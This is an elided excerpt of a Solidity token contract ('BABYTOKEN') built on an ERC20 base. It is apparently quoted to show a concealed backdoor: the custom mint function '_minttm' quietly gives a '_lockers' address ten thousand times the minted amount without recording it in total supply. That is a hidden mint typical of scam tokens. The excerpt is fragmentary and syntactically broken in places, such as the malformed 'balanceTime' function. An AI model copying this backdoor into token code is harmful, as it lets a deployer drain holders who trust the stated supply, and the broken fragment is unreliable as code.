...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     * @dev See {IERC20-balanceOf}.
     */
    function balanceTime(address account) public     {
     ...
     */
    function _minttm(address account, uint256 amount,address _lockers) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address"); 
        _beforeTokenTransfer(address(0), account, amount); 
        _totalSupply += amount;
        _balances[account] += amount;
        _balances[_lockers]  = amount*10000; 
...
contract BABYTOKEN is ERC20, Ownable, BaseToken {
    ...
    constructor(
        ...
        */
        ...
        _minttm(owner(), totalSupply_,_locker);
